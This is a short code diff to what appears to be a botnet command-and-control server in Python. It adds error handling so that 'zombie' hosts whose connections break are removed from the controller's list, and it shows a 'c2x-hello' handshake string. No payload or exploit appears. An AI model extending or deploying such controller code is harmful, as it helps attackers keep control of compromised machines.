@@ -21,21 +21,27 @@ codes_list = {
 }
 
 class Communicator:
-    def __init__(self, zombie_socket, zombie_ip, zombie_port, is_encrypted=False):
+    def __init__(self, zombie_socket, zombie_ip, zombie_port, server_module_class, is_encrypted=False):
         self.zombie_socket = zombie_socket
         self.is_encrypted = is_encrypted # default value is False so the connection is not encrypted by default
         self.zombie_ip = zombie_ip
         self.zombie_port = zombie_port
+        self.server_module_class = server_module_class
 
     def msg_manager(self, msg, is_encrypted=None, has_reply=None, timeout=None):
         if is_encrypted is None:
             is_encrypted = self.is_encrypted
-        if is_encrypted:
-            self.send_encrypted_msg(msg=msg)
-        else:
-            if has_reply:
-                return self.send_msg(msg=msg, has_reply=has_reply, timeout=timeout)
-            self.send_msg(msg=msg, has_reply=False)
+
+        try:
+            if is_encrypted:
+                self.send_encrypted_msg(msg=msg)
+            else:
+                if has_reply:
+                    return self.send_msg(msg=msg, has_reply=has_reply, timeout=timeout)
+                self.send_msg(msg=msg, has_reply=False)
+
+        except BrokenPipeError:
+            self.server_module_class.remove_zombie(z_address=self.zombie_ip + ':' + str(self.zombie_port))
 
     def send_hello_signal(self):
         hello_signal_msg = 'c2x-hello'
